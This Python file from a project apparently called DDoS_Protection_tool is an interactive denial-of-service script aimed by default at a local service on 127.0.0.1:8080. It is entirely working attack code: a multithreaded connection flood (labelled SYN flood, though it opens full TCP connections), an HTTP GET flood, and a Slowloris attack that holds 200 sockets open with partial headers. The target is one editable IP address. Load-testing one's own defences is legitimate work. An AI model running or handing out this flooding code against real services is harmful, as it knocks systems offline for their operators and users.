# DDoS_Protection_tool/attack_enhanced.py

import socket
import threading
import random
import time
import requests # Make sure to install this: pip install requests

# --- Configuration ---
target_ip = '127.0.0.1' # Your local backend service IP
target_port = 8080      # The port your Nginx/backend is listening on

# --- SYN Flood Attack (Your original code, slightly modified for clarity) ---
def syn_flood():
    print("Starting SYN Flood attack...")
    try:
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
            s.close()
    except Exception as e:
        print(f"SYN Flood thread error: {e}")

# --- New: HTTP Flood Attack ---
def http_flood():
    """
    Sends a high volume of HTTP GET requests to the target.
    This simulates an application-layer flood.
    """
    print("Starting HTTP Flood attack...")
    url = f'http://{target_ip}:{target_port}/'
    headers = {'User-Agent': 'DDoS-Attacker-Bot/1.0'}
    try:
        while True:
            requests.get(url, headers=headers)
            # No need for a print here, it will slow down the flood
    except requests.exceptions.RequestException as e:
        # This will likely happen a lot as the server gets overloaded
        pass
    except Exception as e:
        print(f"HTTP Flood thread error: {e}")

# --- New: Slowloris Attack ---
sockets_list = []
def slowloris_attack():
    """
    Opens many connections to the server and keeps them alive by sending partial headers.
    This exhausts the server's connection pool.
    """
    print("Starting Slowloris (slow-rate) attack...")
    # Create and maintain a pool of sockets
    for _ in range(200): # Open 200 connections
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            sockets_list.append(s)
        except Exception as e:
            continue

    print(f"Slowloris: {len(sockets_list)} sockets opened successfully.")

    while True:
        print(f"Slowloris: Sending keep-alive headers to {len(sockets_list)} sockets...")
        for s in list(sockets_list):
            try:
                # Send a partial header to keep the connection open
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            except socket.error:
                sockets_list.remove(s) # Remove dead sockets

        # If sockets die, try to regenerate them
        diff = 200 - len(sockets_list)
        if diff > 0:
            print(f"Slowloris: Reopening {diff} sockets.")
            for _ in range(diff):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((target_ip, target_port))
                    sockets_list.append(s)
                except:
                    pass
        time.sleep(15) # Send keep-alive headers every 15 seconds

# --- Main execution block ---
def launch_attack(attack_type, num_threads):
    print(f"Launching {attack_type} attack with {num_threads} threads.")
    for i in range(num_threads):
        if attack_type == 'syn':
            thread = threading.Thread(target=syn_flood)
        elif attack_type == 'http':
            thread = threading.Thread(target=http_flood)
        elif attack_type == 'slowloris':
            # Slowloris is best run in a single thread managing many sockets
            thread = threading.Thread(target=slowloris_attack)
            thread.daemon = True
            thread.start()
            # We only need one thread for slowloris
            return
        else:
            print("Invalid attack type.")
            return

        thread.daemon = True
        thread.start()

if __name__ == '__main__':
    print("Select attack type:")
    print("1. SYN Flood")
    print("2. HTTP Flood")
    print("3. Slowloris (slow-rate)")
    choice = input("Enter choice (1/2/3): ")

    if choice == '1':
        threads = int(input("Enter number of threads: "))
        launch_attack('syn', threads)
    elif choice == '2':
        threads = int(input("Enter number of threads: "))
        launch_attack('http', threads)
    elif choice == '3':
        launch_attack('slowloris', 1) # Slowloris only needs one "thread"
    else:
        print("Invalid choice.")
        exit()

    # Keep the main thread alive to let the attack run
    print("Attack launched. Press Ctrl+C to stop.")
    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            print("\nAttack stopped.")
            exit()